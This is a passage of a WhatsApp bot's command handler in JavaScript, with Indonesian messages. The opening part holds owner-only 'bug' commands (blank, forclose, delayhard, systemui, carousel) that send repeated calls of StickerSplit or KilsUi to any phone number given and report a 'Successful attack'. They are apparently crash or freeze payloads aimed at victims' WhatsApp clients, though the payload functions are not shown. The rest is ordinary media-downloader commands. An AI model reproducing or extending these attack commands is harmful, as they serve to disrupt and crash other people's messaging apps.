  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)

  oyin.sendMessage(from, {
    react: {
      text: "⚡",
      key: m.key
    }
  });
}
break;


case 'blank': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ʙʟᴀɴᴋ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  
  oyin.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;
 

case 'forclose': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ғᴏʀᴄʟᴏsᴇ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  
  oyin.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'delayhard': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ᴅᴇʟᴀʏʜᴀʀᴅ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  await StickerSplit(oyin, target)
  
  oyin.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'systemui': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : sʏsᴛᴇᴍᴜɪ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)

  oyin.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'carousel': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ᴄᴀʀᴏᴜꜱᴇʟ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  await KilsUi(target)
  
  oyin.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

//====== ======= =======
case 'pap-oline':
case 'pap-olineJkt48': {
  // daftar Foto
  const images = [
    "https://files.catbox.moe/zxkfdk.jpg",
    "https://files.catbox.moe/cwzlw8.jpg",
    "https://files.catbox.moe/5kdo8y.jpg",
    "https://files.catbox.moe/7x2jzs.jpg",
    "https://files.catbox.moe/8v0n2z.jpg",
    "https://files.catbox.moe/v800p6.jpg",
    "https://files.catbox.moe/pw3csn.jpg",
    "https://files.catbox.moe/5yinnb.jpg",
    "https://files.catbox.moe/8u3eip.jpg",
    "https://files.catbox.moe/fnwaem.jpg",
    "https://files.catbox.moe/wic4o4.jpg",
    "https://files.catbox.moe/0woo95.jpg",
    "https://files.catbox.moe/ja6t1y.jpg",
    "https://files.catbox.moe/ttjfhr.jpg",
    "https://files.catbox.moe/6n86pt.jpg",
    "https://files.catbox.moe/ja6t1y.jpg",
    "https://files.catbox.moe/jzeyim.jpg",
    "https://files.catbox.moe/abxp5s.jpg",
    "https://files.catbox.moe/cwzlw8.jpg",
    "https://files.catbox.moe/zu0z8u.jpg",
    "https://files.catbox.moe/xv2vxp.jpg",
    "https://files.catbox.moe/dx47mb.jpg",
    "https://files.catbox.moe/437uz8.jpg",
    "https://files.catbox.moe/xzs6k4.jpg",
    "https://files.catbox.moe/o7lfi7.jpg",
    "https://files.catbox.moe/xhyzk0.jpg",
    "https://files.catbox.moe/3sdkkv.jpg"
  ];

  // pilih foto acak
  const randomImg = images[Math.floor(Math.random() * images.length)];

  await oyin.sendMessage(
    m.chat,
    {
      image: { url: randomImg },
      caption: "*Semangat ku full terus, Gass Gass Gass Oline✨*",
    },
    { quoted: m }
  );
}
break;

case 'git': case 'gitclone': {
if (!args[0]) return m.reply(`*Penggunaan Salah!*\ncontoh: .${command} (link)`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    oyin.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
}
break;
async function snck(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "snackvideo":
      case "snackvidio":
        {
          if (!text) {
            return m.reply(`mana link-nya? contoh: ${prefix + command} https://url/reel/xxx/?igsh=xxx`);
            ZionReact()
          }
          let memek = await snck(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await oyin.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await oyin.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await oyin.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await oyin.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
case 'mediafire':
    case 'mdfr': {
      try {
        if (!text) return m.reply(`*Penggunaan Salah!*\ncontoh: .mediafire Linknya`)
        if (!text.includes('mediafire.com')) return m.reply('Harus berupa link mediafire!')
        
        await oyin.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
        let api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`)
        let data = api.result?.[0]

        let fileNama = decodeURIComponent(data.nama || 'file.zip')
        let extension = fileNama.split('.').pop().toLowerCase()

        let res = await axios.get(data.link, {
          responseType: 'arraybuffer'
        })
        let media = Buffer.from(res.data)

        let mimetype = ''
        if (extension === 'mp4') mimetype = 'video/mp4'
        else if (extension === 'mp3') mimetype = 'audio/mp3'
        else mimetype = `application/${extension}`

        oyin.sendMessage(m.chat, {
          document: media,
          fileName: fileNama,
          mimetype: mimetype
        }, {
          quoted: m
        })

      } catch (err) {
        m.reply('Terjadi kesalahan: ' + err)
      }
    }

break;

async function ccdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "capcut":
      case "cc":
        {
          if (!text) {
            return m.reply(`mana link-nya? contoh: ${prefix + command} https://url/reel/xxx/?igsh=xxx`);
            ZionReact()
          }
          let memek = await ccdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await oyin.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await oyin.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await oyin.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await oyin.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;

async function igdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/igdl?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "instagram":
      case "ig":
        {
          if (!text) {
            return m.reply(`mana link 8nya? contoh: ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
            ZionReact()
          }
          let memek = await igdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await oyin.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await oyin.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: "乂 *I N S T A G R A M  D O W N L O A D* 乂"
                  }, {
                    quoted: m
                  });
                } else {
                  await oyin.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              m.reply(error);
            }
          } else {
            await oyin.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
        
case 'ytmp4': {
    if (!text) return m.reply('Mana link YouTube nya?\nContoh: ytmp4 https://youtube.com/watch?v=xxxxx');    
    m.reply('Sedang memproses video, mohon tunggu sebentar...');

    try {
        await oyin.sendMessage(m.chat, { 
            video: { url: `https://smail.my.id/ytmp4?url=${text}` }, 
            caption: 'Video berhasil di download!'
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        m.reply('Maaf, terjadi kesalahan saat mengambil video.');
    }
}
break;

case 'ytmp3': {
    if (!text) return m.reply('Mana link YouTube nya?\nContoh: ytmp3 https://youtube.com/watch?v=xxxxx');    
    m.reply('Sedang memproses audio, mohon tunggu sebentar...');

    try {
        await oyin.sendMessage(m.chat, { 
            audio: { url: `https://smail.my.id/ytmp3?url=${text}` },
            mimetype: 'audio/mpeg', 
            fileName: 'audio.mp3'
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        m.reply('Maaf, terjadi kesalahan saat mengambil audio.');
    }
}
break;

case "intro":
case "intro-card": {
  m.reply(`> INTRO CARD [ ! ]
  ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Nama :
Umur :
Gender :
Tanggal lahir:
Alamat rumah :
Tanggal lahir :
Nisn (Opsional) : 
